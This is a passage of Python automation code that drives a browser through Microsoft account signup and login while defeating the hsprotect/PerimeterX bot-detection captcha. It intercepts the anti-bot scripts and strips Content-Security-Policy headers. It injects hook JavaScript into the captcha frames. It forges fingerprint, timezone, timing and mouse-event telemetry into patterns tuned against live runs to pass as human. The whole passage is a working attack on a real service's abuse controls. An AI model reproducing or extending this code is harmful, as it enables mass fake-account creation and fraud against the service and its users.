        "page_url": getattr(page, "url", ""),
        "frames": collect_probe_state(page),
    }
    try:
        collector_state = getattr(page, "_pxprobe_collector_capture", None)
        if collector_state:
            data["collector_capture"] = {
                "last": collector_state.get("last"),
                "items": list(collector_state.get("items") or []),
                "responses": list(collector_state.get("responses") or []),
            }
    except Exception:
        pass
    path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
    return path, data


def new_page_with_context_hook(
    controller,
    hook_js=None,
    install_top_hook=True,
    install_route_hook=True,
    normalize_y1nz_preproof=False,
    final_proof_mode="minimal",
    preserve_final_bfa=False,
    optimistic_final_success=False,
    optimistic_w0_success=False,
    rewrite_final_result_success=False,
    trigger_final_success_signals=False,
    defer_final_result_to_w0=False,
    defer_final_result_to_w0_wait_ms=2500,
    neutral_final_fetch_w0=False,
    neutral_final_merge_w0_success=False,
    neutral_final_cached_w0_success=False,
    neutral_final_cached_rich_w0_success=False,
    real_final_neutral_w0_success=False,
    session_cached_rich_final_success=False,
    session_cached_rich_w0_success=False,
    session_cached_rich_final_and_w0_success=False,
    warmup_neutral_then_rich_final_and_w0_success=False,
    session_cached_rich_initial_w0_delay_ms=0,
    async_early_cached_rich_w0=False,
    final_response_delay_ms=0,
    suppress_unforced_final_for_synthetic=False,
    delay_captcha_close_ms=0,
    risk_verify_gate_ms=0,
    risk_verify_gate_timeout_ms=1500,
    risk_verify_human_success_age_ms=0,
    risk_verify_human_success_timeout_ms=0,
    risk_verify_challenge_to_continue=False,
):
    """
    Page.add_init_script after page creation was not early enough for the
    hsprotect child frames in Patchright persistent contexts. Install the hook
    on the browser context before creating the page, then also add it to the
    page as a fallback.

    For live stealth checks, install_top_hook=False keeps the signup top frame
    pristine and relies on route injection for hsprotect-controlled frames.
    """
    hook_js = hook_js or build_runtime_hook_js()
    browser_or_context = controller.get_thread_browser()

    def reuse_startup_blank_page(context):
        """Reuse the browser's initial about:blank tab when it is safe.

        CloakBrowser/persistent contexts usually open a default blank tab before
        Playwright creates our controlled page.  If we always call new_page(),
        the operator sees an apparently empty Chrome/Cloak window while the
        automation is running in a second tab/page.  For fresh persistent
        profiles that blank tab has not navigated yet, so page.add_init_script()
        still applies to future navigations and it is safe to reuse.
        """
        try:
            pages = list(getattr(context, "pages", []) or [])
        except Exception:
            pages = []
        for candidate in pages:
            try:
                url = str(getattr(candidate, "url", "") or "")
                if url in {"", "about:blank"}:
                    try:
                        candidate.bring_to_front()
                    except Exception:
                        pass
                    return candidate
            except Exception:
                continue
        return None

    if getattr(controller, "connected_over_cdp", False):
        # CDP mode is meant for an already-launched fingerprint browser
        # profile.  Reuse its existing default context so the profile's real
        # fingerprint/cookies/extensions remain active.
        contexts = []
        try:
            contexts = list(browser_or_context.contexts)
        except Exception:
            contexts = []
        if contexts:
            context = contexts[0]
        else:
            context = browser_or_context.new_context(**controller.context_options)
        if install_top_hook:
            try:
                context.add_init_script(hook_js)
            except Exception as exc:
                print(f"[Probe] context add_init_script failed: {exc!r}")
        page = context.new_page()
    elif controller.user_data_dir:
        if install_top_hook:
            try:
                browser_or_context.add_init_script(hook_js)
            except Exception as exc:
                print(f"[Probe] context add_init_script failed: {exc!r}")
        page = reuse_startup_blank_page(browser_or_context)
        if page:
            print("[Probe] reusing startup about:blank page")
        else:
            page = browser_or_context.new_page()
    else:
        context = browser_or_context.new_context(**controller.context_options)
        if install_top_hook:
            try:
                context.add_init_script(hook_js)
            except Exception as exc:
                print(f"[Probe] context add_init_script failed: {exc!r}")
        page = context.new_page()
    if install_top_hook:
        try:
            page.add_init_script(hook_js)
        except Exception:
            pass
    if install_route_hook:
        attach_route_injector(page, hook_js, include_top_docs=install_top_hook)
    else:
        print("[Probe] route injector skipped; runtime hook will be installed later")
        attach_collector_capture(page)
        if normalize_y1nz_preproof:
            attach_y1nz_preproof_normalizer(
                page,
                final_proof_mode=final_proof_mode,
                preserve_final_bfa=preserve_final_bfa,
                optimistic_final_success=optimistic_final_success,
                optimistic_w0_success=optimistic_w0_success,
                rewrite_final_result_success=rewrite_final_result_success,
                trigger_final_success_signals=trigger_final_success_signals,
                defer_final_result_to_w0=defer_final_result_to_w0,
                defer_final_result_to_w0_wait_ms=defer_final_result_to_w0_wait_ms,
                neutral_final_fetch_w0=neutral_final_fetch_w0,
                neutral_final_merge_w0_success=neutral_final_merge_w0_success,
                neutral_final_cached_w0_success=neutral_final_cached_w0_success,
                neutral_final_cached_rich_w0_success=neutral_final_cached_rich_w0_success,
                real_final_neutral_w0_success=real_final_neutral_w0_success,
                session_cached_rich_final_success=session_cached_rich_final_success,
                session_cached_rich_w0_success=session_cached_rich_w0_success,
                session_cached_rich_final_and_w0_success=session_cached_rich_final_and_w0_success,
                warmup_neutral_then_rich_final_and_w0_success=warmup_neutral_then_rich_final_and_w0_success,
                session_cached_rich_initial_w0_delay_ms=session_cached_rich_initial_w0_delay_ms,
                async_early_cached_rich_w0=async_early_cached_rich_w0,
                final_response_delay_ms=final_response_delay_ms,
                suppress_unforced_final_for_synthetic=suppress_unforced_final_for_synthetic,
                delay_captcha_close_ms=delay_captcha_close_ms,
                risk_verify_gate_ms=risk_verify_gate_ms,
                risk_verify_gate_timeout_ms=risk_verify_gate_timeout_ms,
                risk_verify_human_success_age_ms=risk_verify_human_success_age_ms,
                risk_verify_human_success_timeout_ms=risk_verify_human_success_timeout_ms,
            )
        if risk_verify_challenge_to_continue:
            attach_risk_verify_continue_rewriter(page)
    if not install_top_hook and install_route_hook:
        print("[Probe] top-frame init hook disabled; using hsprotect route injection only")
    elif not install_top_hook:
        print("[Probe] top-frame init hook disabled; hsprotect runtime hook deferred")
    return page


def attach_route_injector(page, hook_js=None, include_top_docs=True):
    """
    Patchright add_init_script did not reliably appear inside hsprotect child
    frames in this target. Route-level injection is more deterministic: prepend
    the hook to hsprotect JS assets before their own code runs, so XHR and PX API
    wrappers are active during captcha initialization and hold verification.
    """
    hook_js = hook_js or build_runtime_hook_js()
    js_target_markers = (
        "client.hsprotect.net/PXzC5j78di/main.min.js",
        "captcha.hsprotect.net/PXzC5j78di/captcha.js",
    )
    doc_target_markers = ["iframe.hsprotect.net/index.html"]
    if include_top_docs:
        doc_target_markers.extend([
            "signup.live.com/signup",
            "login.live.com/login.srf",
        ])
    doc_target_markers = tuple(doc_target_markers)

    def strip_security_headers(headers):
        out = dict(headers)
        for key in list(out.keys()):
            lk = key.lower()
            if lk in {"content-length", "content-security-policy", "content-security-policy-report-only"}:
                out.pop(key, None)
        return out

    def handler(route, request):
        url = request.url
        try:
            is_js_target = any(marker in url for marker in js_target_markers)
            is_doc_target = any(marker in url for marker in doc_target_markers)
            if not is_js_target and not is_doc_target:
                return route.continue_()
            response = route.fetch()
            body = response.text()
            headers = strip_security_headers(response.headers)
            if is_js_target:
                marker = (
                    "\n;try{window.__pxProbe && window.__pxProbe.events && "
                    "window.__pxProbe.events.push({t:Date.now(),kind:'route_injected_js',data:{url:location.href,asset:"
                    + json.dumps(url)
                    + "}})}catch(_){ }\n"
                )
                patched = hook_js + marker + "\n" + body
                headers["content-type"] = headers.get("content-type", "application/javascript")
                print(f"[Probe] route injected JS {url}")
            else:
                script = "<script>" + hook_js + "\n;try{window.__pxProbe&&window.__pxProbe.events.push({t:Date.now(),kind:'route_injected_doc',data:{url:location.href}})}catch(_){}</script>"
                lower = body.lower()
                pos = lower.find("<head")
                if pos >= 0:
                    end = body.find(">", pos)
                    patched = body[: end + 1] + script + body[end + 1 :]
                else:
                    patched = script + body
                headers["content-type"] = headers.get("content-type", "text/html; charset=utf-8")
                print(f"[Probe] route injected DOC {url}")
            route.fulfill(response=response, body=patched, headers=headers)
        except Exception as exc:
            print(f"[Probe] route inject error for {url}: {exc!r}")
            try:
                route.continue_()
            except Exception:
                pass

    try:
        page.route("**/*", handler)
        print("[Probe] route injector installed")
    except Exception as exc:
        print(f"[Probe] route injector install failed: {exc!r}")


def _replace_form_field_preserve(body: str, key: str, value: str) -> str:
    parts = str(body or "").split("&")
    out = []
    replaced = False
    for part in parts:
        name = part.split("=", 1)[0] if "=" in part else part
        if name == key:
            out.append(f"{key}={value}")
            replaced = True
        else:
            out.append(part)
    if not replaced:
        out.append(f"{key}={value}")
    return "&".join(out)


def _encode_collector_body_from_events(body: str, form: dict, events: list) -> str:
    payload, _json_text, pc = encode_payload_from_events(events, form)
    out = _replace_form_field_preserve(body, "payload", payload)
    out = _replace_form_field_preserve(out, "pc", pc)
    return out


def _normalize_y1nz_preproof_events(events: list) -> tuple[bool, list[dict]]:
    changes = []
    changed = False
    for ev in events or []:
        if not isinstance(ev, dict) or ev.get("t") != "Y1NZWSUzXWs=":
            continue
        d = ev.get("d")
        if not isinstance(d, dict):
            continue
        href = str(d.get("SlpwEAw5eSc=", ""))
        if "ch_ctx=1" not in href:
            continue

        before = {
            "AEw6": d.get("AEw6BkUvPzI="),
            "R3c": d.get("R3c9PQEXNg8="),
            "XGhm": d.get("XGhmYhkIbVU="),
            "V0ct": d.get("V0ctTREnI3c="),
            "rtt": d.get("KxsREW58GCI="),
            "downlink": d.get("LVkXU2s6EmI="),
            "dEA": d.get("dEAOCjEkBTE="),
            "JnZ": d.get("JnZcfGMXVEo="),
            "Fm": d.get("FmYsbFMFKVk="),
        }

        # Manual Cloak success baseline, second Y1NZ (ch_ctx=1).
        # Keep dynamic qi/session/url/hash/stack fields; normalize the small
        # pre-proof fingerprint/timing cluster that distinguishes score|0 from
        # the current score|1 samples.
        target_values = {
            "AEw6BkUvPzI=": 105,
            "XGhmYhkIbVU=": 279.1,
            "R3c9PQEXNg8=": 1117,
            "V0ctTREnI3c=": 7,
            "KxsREW58GCI=": 100,
            "LVkXU2s6EmI=": 1.55,
            "dEAOCjEkBTE=": 2,
            "JnZcfGMXVEo=": 4730,
            "FmYsbFMFKVk=": 174,
            "ViZsLBBGYxc=": 17637001,
            "ICxaJmZBVBc=": 33064345,
            "GwthAV5raTA=": "Asia/Hong_Kong",
            "GwthAV1tZTM=": -480,
            "WGRibh4EZ18=": "zh-CN",
        }
        for key, value in target_values.items():
            if d.get(key) != value:
                d[key] = value
                changed = True

        conn = d.get("cR1LFzR9QSw=")
        if isinstance(conn, dict):
            status = conn.get("status")
            if isinstance(status, dict):
                conn_changed = False
                for key, value in {"effectiveType": "4g", "rtt": 100, "downlink": 1.55, "saveData": False}.items():
                    if status.get(key) != value:
                        status[key] = value
                        conn_changed = True
                if conn_changed:
                    changed = True

        after = {
            "AEw6": d.get("AEw6BkUvPzI="),
            "R3c": d.get("R3c9PQEXNg8="),
            "XGhm": d.get("XGhmYhkIbVU="),
            "V0ct": d.get("V0ctTREnI3c="),
            "rtt": d.get("KxsREW58GCI="),
            "downlink": d.get("LVkXU2s6EmI="),
            "dEA": d.get("dEAOCjEkBTE="),
            "JnZ": d.get("JnZcfGMXVEo="),
            "Fm": d.get("FmYsbFMFKVk="),
        }
        if before != after:
            changes.append({"before": before, "after": after})
    return changed, changes


_PX561_DZ_TEMPLATE = [
    {"PX12343": "mouseover", "PX11652": 0, "PX11699": 11042, "PX12270": "true"},
    {"PX12343": "mouseover", "PX11652": 1, "PX11699": 10036, "PX12270": "true"},
    {"PX12343": "mouseout", "PX11652": 1, "PX11699": 13053, "PX12270": "true"},
    {"PX12343": "mouseover", "PX11652": 1, "PX11699": 13053, "PX12270": "true"},
    {"PX12343": "mouseout", "PX11652": 1, "PX11699": 13062, "PX12270": "true"},
    {"PX12343": "mouseover", "PX11652": 1, "PX11699": 13062, "PX12270": "true"},
    {"PX12343": "pointerup", "PX11652": 1, "PX11699": 13298, "PX12270": "true"},
]

_PX561_GU_TEMPLATE = [
    "209,68,10468",
    "208,64,10474",
    "207,59,10486",
    "205,58,10565",
    "206,59,10577",
    "207,59,12437",
    "207,57,13573",
]

_PX561_JNP_TEMPLATE = [
    "209,68,10468",
    "209,66,10469",
    "208,64,10474",
    "208,61,10480",
    "207,59,10486",
    "205,56,10497",
    "205,58,10565",
    "206,58,10569",
    "206,59,10577",
    "206,59,10731",
    "207,59,12437",
    "207,59,12463",
    "207,57,13573",
]


def _clean_probe_globals_from_events(events: list) -> bool:
    changed = False
    for ev in events or []:
        d = ev.get("d") if isinstance(ev, dict) else None
        if not isinstance(d, dict):
            continue
        for key, value in list(d.items()):
            if isinstance(value, list):
                filtered = [x for x in value if not (isinstance(x, str) and x.startswith("__pxProbe"))]
                if len(filtered) != len(value):
                    d[key] = filtered
                    changed = True
    return changed


def _sample_px_series(values, limit: int) -> list:
    if not isinstance(values, list):
        return values
    if len(values) <= limit:
        return values
    if limit <= 2:
        return values[:limit]
    picked = []
    last_pos = len(values) - 1
    used = set()
    for i in range(limit):
        pos = round(i * last_pos / (limit - 1))
        if pos not in used:
            picked.append(values[pos])
            used.add(pos)
    return picked


def _stable_int(*parts, mod: int = 1000) -> int:
    """Small deterministic jitter for route-level rewrites.

    The Python route normalizer runs outside the page, so using randomness
    makes offline replay hard to compare.  Use a stable hash-derived jitter
    instead; this keeps each run's shape slightly different without making
    validation non-reproducible.
    """
    try:
        text = "|".join(str(p) for p in parts)
        return int(hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:8], 16) % max(1, int(mod))
    except Exception:
        return 0


def _parse_px_point(point):
    parts = str(point or "").split(",")
    x = parts[0] if len(parts) > 0 else "0"
    y = parts[1] if len(parts) > 1 else "0"
    try:
        t = float(parts[2] if len(parts) > 2 else 0)
    except Exception:
        t = 0.0
    return x, y, t


def _sample_coord_series(values, limit: int, start_t: float, end_t: float, exact: bool = False) -> list:
    if not isinstance(values, list) or not values:
        return values
    if exact and limit > 1:
        last_pos = len(values) - 1
        sampled = [values[round(i * last_pos / (limit - 1))] for i in range(limit)]
    else:
        sampled = _sample_px_series(values, limit)
    if not isinstance(sampled, list) or len(sampled) < 2:
        return sampled
    parsed = [_parse_px_point(v) for v in sampled]
    ratios = []
    for idx, (_x, _y, _t) in enumerate(parsed):
        ratios.append(idx / float(max(1, len(parsed) - 1)))
    out = []
    for (x, y, _t), ratio in zip(parsed, ratios):
        nt = round(float(start_t) + max(0.0, min(1.0, ratio)) * (float(end_t) - float(start_t)))
        out.append(f"{x},{y},{nt}")
    return out


def _normalize_px561_short_envelope(d: dict, qs=None, force_short: bool = False) -> bool:
    """Compress multi-attempt natural proof into the known accepted short no-U0 envelope.

    This is deliberately narrower than ``template``: it only triggers for
    obviously overlong / multi-attempt PX561 packets and keeps the current
    run's sampled coordinates, but rewrites the timing envelope that proved
    toxic in live runs (40s+ e, 10s+ z, low bzt, huge Dz/GU/JNP).
    """
    try:
        old_e = float(d.get("eEgJDj4mCD4=", 0))
    except Exception:
        old_e = 0.0
    try:
        z_value = d.get("ZjoXPCNQGQw=")
        old_duration = float(z_value[0] if isinstance(z_value, list) and z_value else 0)
    except Exception:
        old_duration = 0.0
    dz = d.get("DzN+dUlTekE=")
    gu = d.get("GUloT18mZ3U=")
    jnp = d.get("JnpXfGMUUUc=")
    try:
        bzt = float(d.get("Bzt2fUFRcw=="))
    except Exception:
        bzt = None
    needs_short = (
        force_short
        or
        old_e > 15000
        or (isinstance(dz, list) and len(dz) > 14)
        or (isinstance(gu, list) and len(gu) > 40)
        or (isinstance(jnp, list) and len(jnp) > 80)
        or (bzt is not None and bzt < 2500)
    )
    if not needs_short:
        return False

    seed = f"{old_e}:{old_duration}:{d.get('QS07ZwRKPlU=', qs)}"
    e = 9600 + _stable_int(seed, "e", mod=951)              # 9600..10550
    duration = 3000 + _stable_int(seed, "z", mod=701)       # 3000..3700
    wi = e + duration
    ui = wi + 24 + _stable_int(seed, "ui", mod=19)          # +24..42
    xq = ui + 470 + _stable_int(seed, "xq", mod=121)
    base_qs = qs
    try:
        base_qs = int(float(d.get("QS07ZwRKPlU=", qs)))
    except Exception:
        try:
            base_qs = int(float(qs))
        except Exception:
            base_qs = None

    before = {
        "e": d.get("eEgJDj4mCD4="),
        "z": d.get("ZjoXPCNQGQw="),
        "wi": d.get("WiZrIB9LbBU="),
        "ui": d.get("Ui5jKBREZxs="),
        "bzt": d.get("Bzt2fUFRcw=="),
        "s3": d.get("S3sxMQ0YNQo="),
        "gu": len(gu) if isinstance(gu, list) else None,
        "jnp": len(jnp) if isinstance(jnp, list) else None,
    }

    d["eEgJDj4mCD4="] = e
    d["ZjoXPCNQGQw="] = [duration]
    d["WiZrIB9LbBU="] = wi
    d["Ui5jKBREZxs="] = ui
    if "XQUsAxhpKjU=" in d:
        d["XQUsAxhpKjU="] = xq
    if "Bzt2fUFRcw==" in d:
        d["Bzt2fUFRcw=="] = ui + 55 + _stable_int(seed, "bzt", mod=56)
    if "S3sxMQ0YNQo=" in d:
        d["S3sxMQ0YNQo="] = ui + 700 + _stable_int(seed, "s3", mod=261)
    if "QABxRgZqcXQ=" in d:
        d["QABxRgZqcXQ="] = 220 + _stable_int(seed, "qab", mod=181)
    if "KVkYX28zG2o=" in d:
        d["KVkYX28zG2o="] = 2450 + _stable_int(seed, "kv28", mod=521)
    if base_qs is not None:
        p_arn = int(base_qs - xq - 3)
        d["PARNQnlrTHQ="] = p_arn
        d["KVkYX2w2GWg="] = [p_arn + e + 12 + _stable_int(seed, "kv2", mod=19)]

    # Rescale movement arrays to accepted lengths while preserving this run's
    # coordinate samples.
    start_t = e + 165 + _stable_int(seed, "start", mod=46)
    end_t = max(wi + 210, ui + 225 + _stable_int(seed, "end", mod=71))
    if isinstance(gu, list):
        d["GUloT18mZ3U="] = _sample_coord_series(gu, 7, start_t, end_t)
    if isinstance(jnp, list):
        d["JnpXfGMUUUc="] = _sample_coord_series(jnp, 13, start_t, end_t)

    # Force the compact accepted event pattern, keeping representative current
    # event objects so coordinate-related extra fields survive.
    if isinstance(dz, list) and dz:
        mouse_src = next((x for x in dz if isinstance(x, dict) and x.get("PX12343") in ("mouseover", "mousemove")), {})
        pointer_src = next((x for x in reversed(dz) if isinstance(x, dict) and x.get("PX12343") in ("pointerup", "mouseup")), mouse_src)

        def make(src, typ, cnt, t):
            item = dict(src) if isinstance(src, dict) else {}
            item["PX12343"] = typ
            item["PX11652"] = cnt
            item["PX11699"] = int(round(t))
            item.setdefault("PX12270", "true")
            return item

        t0 = e + 650 + _stable_int(seed, "dz0", mod=261)
        t1 = max(0, e - (180 + _stable_int(seed, "dz1", mod=261)))
        edge1 = wi - (230 + _stable_int(seed, "edge1", mod=81))
        edge2 = edge1 + 7 + _stable_int(seed, "edge2", mod=13)
        d["DzN+dUlTekE="] = [
            make(mouse_src, "mouseover", 0, t0),
            make(mouse_src, "mouseover", 1, t1),
            make(mouse_src, "mouseout", 1, edge1),
            make(mouse_src, "mouseover", 1, edge1),
            make(mouse_src, "mouseout", 1, edge2),
            make(mouse_src, "mouseover", 1, edge2),
            make(pointer_src, "pointerup", 1, wi),
        ]

    return True


def _normalize_px561_ads_long_envelope(d: dict, qs=None) -> bool:
    """Rewrite PX561 into the observed AdsPower accepted long/no-U0 shape.

    The compact ``minimal`` normalizer matches the old short-proof line, but the
    AdsPower success sample that survives score|1 keeps a long hold envelope
    (e≈7.4s, z≈12.2s, PX/JD/BFA R3≈20.6s) plus BFA.  This keeps the current
    run's coordinates and high-volume GU/JNP streams, but moves the timing
    fields into that accepted ADS-long cluster.
    """
    if not isinstance(d, dict):
        return False
    seed = f"{d.get('QS07ZwRKPlU=', qs)}:{d.get('PARNQnlrTHQ=')}:{d.get('WiZrIB9LbBU=')}"
    e = 7250 + _stable_int(seed, "ads-e", mod=351)                  # 7250..7600
    duration = 12050 + _stable_int(seed, "ads-z", mod=351)          # 12050..12400
    wi = e + duration + (_stable_int(seed, "ads-wi", mod=21) - 10)
    ui = wi + 8 + _stable_int(seed, "ads-ui", mod=13)               # +8..20
    r3 = ui + 980 + _stable_int(seed, "ads-r3", mod=141)            # +980..1120
    xq = ui + 5

    before = {
        "e": d.get("eEgJDj4mCD4="),
        "z": d.get("ZjoXPCNQGQw="),
        "wi": d.get("WiZrIB9LbBU="),
        "ui": d.get("Ui5jKBREZxs="),
        "r3": d.get("R3c9PQEXNg8="),
        "s3": d.get("S3sxMQ0YNQo="),
        "bzt": d.get("Bzt2fUFRcw=="),
        "xq": d.get("XQUsAxhpKjU="),
    }

    d["eEgJDj4mCD4="] = int(e)
    d["ZjoXPCNQGQw="] = [int(duration)]
    d["WiZrIB9LbBU="] = int(wi)
    d["Ui5jKBREZxs="] = int(ui)
    d["R3c9PQEXNg8="] = int(r3)
    if "XQUsAxhpKjU=" in d:
        d["XQUsAxhpKjU="] = int(xq)
    if "S3sxMQ0YNQo=" in d:
        d["S3sxMQ0YNQo="] = int(wi + 320 + _stable_int(seed, "ads-s3", mod=181))
    if "Bzt2fUFRcw==" in d:
        d["Bzt2fUFRcw=="] = 455 + (_stable_int(seed, "ads-bzt", mod=801) / 10.0)
    if "QABxRgZqcXQ=" in d:
        d["QABxRgZqcXQ="] = 2950 + _stable_int(seed, "ads-qab", mod=451)
    if "KVkYX28zG2o=" in d:
        d["KVkYX28zG2o="] = 8750 + _stable_int(seed, "ads-kv28", mod=701)
    if isinstance(d.get("GCgpLl1AKRw="), list):
        d["GCgpLl1AKRw="] = ["BODY", "#px-captcha", ""]

    base_qs = qs
    try:
        base_qs = int(float(d.get("QS07ZwRKPlU=", qs)))
    except Exception:
        try:
            base_qs = int(float(qs))
        except Exception:
            base_qs = None
    if base_qs is not None:
        p_arn = int(base_qs - xq - 2)
        d["PARNQnlrTHQ="] = p_arn
        d["KVkYX2w2GWg="] = [p_arn + int(e) + 10 + _stable_int(seed, "ads-kv2", mod=15)]

    dz = d.get("DzN+dUlTekE=")
    if isinstance(dz, list) and dz:
        mouse_src = next((x for x in dz if isinstance(x, dict) and x.get("PX12343") in ("mouseover", "mousemove")), {})
        out_src = next((x for x in dz if isinstance(x, dict) and x.get("PX12343") == "mouseout"), mouse_src)
        pointer_src = next((x for x in reversed(dz) if isinstance(x, dict) and x.get("PX12343") in ("pointerup", "mouseup")), mouse_src)

        def make(src, typ, cnt, t):
            item = dict(src) if isinstance(src, dict) else {}
            item["PX12343"] = typ
            item["PX11652"] = cnt
            item["PX11699"] = int(round(t))
            item.setdefault("PX12270", "true")
            return item

        early_a = 1750 + _stable_int(seed, "ads-dz-a", mod=190)
        early_b = 2700 + _stable_int(seed, "ads-dz-b", mod=220)
        early_c = 2920 + _stable_int(seed, "ads-dz-c", mod=170)
        mid = 3500 + _stable_int(seed, "ads-dz-mid", mod=260)
        edge1 = wi - (3150 + _stable_int(seed, "ads-edge1", mod=130))
        edge2 = edge1 + 28 + _stable_int(seed, "ads-edge2", mod=35)
        # Score|1 ADS successes consistently carried a denser Dz stream
        # (roughly 20-27 records, max counter=2).  Earlier ads_long builds
        # compressed this to 14 records and still got result|-1.  Keep the
        # same counter ceiling, but expand the synthetic edge/move cadence.
        dense_dz = [
            make(mouse_src, "mouseover", 0, early_a),
            make(mouse_src, "mousemove", 0, early_a + 18 + _stable_int(seed, "ads-dz-g0", mod=20)),
            make(out_src, "mouseout", 0, early_b),
            make(mouse_src, "mouseover", 1, early_b + 24 + _stable_int(seed, "ads-dz-g1", mod=30)),
            make(mouse_src, "mousemove", 1, early_b + 75 + _stable_int(seed, "ads-dz-g2", mod=35)),
            make(out_src, "mouseout", 1, early_c),
            make(mouse_src, "mouseover", 1, mid),
        ]
        span_start = mid + 120 + _stable_int(seed, "ads-dz-span0", mod=90)
        span_end = max(span_start + 260, edge1 - 120)
        for idx in range(9):
            t = span_start + ((span_end - span_start) * idx / 8.0)
            t += _stable_int(seed, f"ads-dz-move-{idx}", mod=41) - 20
            dense_dz.append(make(mouse_src, "mousemove", 1 if idx < 3 else 2, t))
        dense_dz.extend([
            make(out_src, "mouseout", 2, edge1),
            make(mouse_src, "mouseover", 2, edge1 + 24 + _stable_int(seed, "ads-dz-edge-a", mod=31)),
            make(mouse_src, "mousemove", 2, edge1 + 55 + _stable_int(seed, "ads-dz-edge-b", mod=35)),
            make(out_src, "mouseout", 2, edge2),
            make(mouse_src, "mouseover", 2, edge2 + 18 + _stable_int(seed, "ads-dz-edge-c", mod=30)),
            make(mouse_src, "mousemove", 2, max(edge2 + 45, wi - 95 + _stable_int(seed, "ads-dz-preup", mod=35))),
            make(pointer_src, "pointerup", 2, wi),
            make(pointer_src, "mouseup", 2, wi + 8 + _stable_int(seed, "ads-dz-up", mod=16)),
        ])
        d["DzN+dUlTekE="] = sorted(dense_dz, key=lambda item: item.get("PX11699", 0))

    gu = d.get("GUloT18mZ3U=")
    if isinstance(gu, list):
        d["GUloT18mZ3U="] = _sample_coord_series(gu, 150, 2200 + _stable_int(seed, "ads-gu0", mod=160), 5900 + _stable_int(seed, "ads-gu1", mod=360), exact=True)
    jnp = d.get("JnpXfGMUUUc=")
    if isinstance(jnp, list):
        d["JnpXfGMUUUc="] = _sample_coord_series(jnp, 450, 2200 + _stable_int(seed, "ads-jnp0", mod=160), r3 - (520 + _stable_int(seed, "ads-jnp1", mod=220)), exact=True)

    after = {
        "e": d.get("eEgJDj4mCD4="),
        "z": d.get("ZjoXPCNQGQw="),
        "wi": d.get("WiZrIB9LbBU="),
        "ui": d.get("Ui5jKBREZxs="),
        "r3": d.get("R3c9PQEXNg8="),
        "s3": d.get("S3sxMQ0YNQo="),
        "bzt": d.get("Bzt2fUFRcw=="),
        "xq": d.get("XQUsAxhpKjU="),
    }
    return before != after


def _px561_looks_ads_raw_accepted(d: dict) -> bool:
    """Return True when live PX561 already sits in the ADS accepted cluster.

    Several accepted ADS/manual samples do *not* require route-side timing
    rewrites: they naturally carry BFA, e≈2-3.2s, z≈11-13.5s, PX r3≈14.6-18.1s
    and small Dz streams.  The 20260705 result|-1 sample was in this cluster
    before the normalizer stretched it into the synthetic ads_long shape, so the
    safe mode should leave such packets intact.
    """
    if not isinstance(d, dict):
        return False
    try:
        e = float(d.get("eEgJDj4mCD4="))
        z = d.get("ZjoXPCNQGQw=")
        duration = float(z[0] if isinstance(z, list) and z else z)
        ui = float(d.get("Ui5jKBREZxs="))
        r3 = float(d.get("R3c9PQEXNg8="))
    except Exception:
        return False
    dz = d.get("DzN+dUlTekE=")
    dz_len = len(dz) if isinstance(dz, list) else 0
    has_click = any(isinstance(x, dict) and x.get("PX12343") == "click" for x in (dz or []))
    return (
        1800 <= e <= 3500
        and 10800 <= duration <= 13600
        and 14500 <= r3 <= 18550
        and 850 <= (r3 - ui) <= 1850
        and 5 <= dz_len <= 50
        and not has_click
    )


def _normalize_px561_ads_safe_dz(d: dict) -> bool:
    """Repair only clearly impossible Dz timestamps in an ADS-like raw proof."""
    dz = d.get("DzN+dUlTekE=")
    if not isinstance(dz, list) or not dz:
        return False
    try:
        wi = int(round(float(d.get("WiZrIB9LbBU="))))
        r3 = int(round(float(d.get("R3c9PQEXNg8="))))
    except Exception:
        return False

    rows = [x for x in dz if isinstance(x, dict)]
    if not rows:
        return False

    def etype(item):
        return str(item.get("PX12343") or "")

    def ts(item):
        try:
            return float(item.get("PX11699"))
        except Exception:
            return None

    bad = False
    last_pointerup_idx = -1
    for idx, item in enumerate(rows):
        t = ts(item)
        if t is not None and (t < -50 or t > max(wi, r3) + 250):
            bad = True
        if etype(item) == "pointerup":
            last_pointerup_idx = idx
    if last_pointerup_idx != len(rows) - 1:
        bad = True
    if not bad:
        return False

    seed = f"{d.get('QS07ZwRKPlU=')}:{wi}:{r3}:{len(rows)}"
    mouse_src = next((x for x in rows if etype(x) in ("mouseover", "mousemove")), rows[0])
    out_src = next((x for x in rows if etype(x) == "mouseout"), mouse_src)
    pointer_src = next((x for x in reversed(rows) if etype(x) in ("pointerup", "mouseup")), mouse_src)

    def make(src, typ, cnt, t):
        item = dict(src) if isinstance(src, dict) else {}
        item["PX12343"] = typ
        item["PX11652"] = cnt
        item["PX11699"] = int(round(max(0, min(t, wi))))
        item.setdefault("PX12270", "true")
        return item

    edge1 = wi - (3600 + _stable_int(seed, "ads-safe-edge1", mod=2601))
    edge1 = max(0, min(edge1, wi - 180))
    edge2 = edge1 + 55 + _stable_int(seed, "ads-safe-edge2", mod=85)
    edge2 = max(edge1, min(edge2, wi - 80))
    fixed = [
        make(mouse_src, "mouseover", 0, 0),
        make(out_src, "mouseout", 0, 0),
        make(mouse_src, "mouseover", 1, 0),
        make(mouse_src, "mouseover", 2, 0),
        make(out_src, "mouseout", 2, edge1),
        make(mouse_src, "mouseover", 2, edge1 + _stable_int(seed, "ads-safe-e1-gap", mod=2)),
        make(out_src, "mouseout", 2, edge2),
        make(mouse_src, "mouseover", 2, edge2 + _stable_int(seed, "ads-safe-e2-gap", mod=2)),
        make(pointer_src, "pointerup", 2, wi),
    ]
    d["DzN+dUlTekE="] = fixed
    return True


def _normalize_px561_ads_safe_envelope(d: dict, qs=None) -> bool:
    """Conservative ADS/BFA final normalizer.

    If the browser already generated an ADS-like BFA final, do not rewrite
    timing, Dz, GU, JNP or BFA-correlated fields.  This is meant for the current
    1s route where time-warp already yields a natural-looking long proof; the
    previous unconditional ``ads_long`` rewrite could turn a good raw packet
    into a server ``result|-1``.  If the raw proof is clearly outside the
    accepted envelope, fall back to the older synthetic ads_long rescue.
    """
    if not isinstance(d, dict):
        return False
    if _px561_looks_ads_raw_accepted(d):
        # Keep the raw proof intact.  Only make a tiny selector normalization
        # that is present in accepted traces and does not affect timings.
        changed = _normalize_px561_ads_safe_dz(d)
        if isinstance(d.get("GCgpLl1AKRw="), list) and d.get("GCgpLl1AKRw=") != ["BODY", "#px-captcha", ""]:
            d["GCgpLl1AKRw="] = ["BODY", "#px-captcha", ""]
            changed = True
        return changed
    return _normalize_px561_ads_long_envelope(d, qs=qs)


def _normalize_px561_old_1s_envelope(d: dict, qs=None) -> bool:
    """Rewrite PX561 into the old accepted 20260620 accelerated cluster.

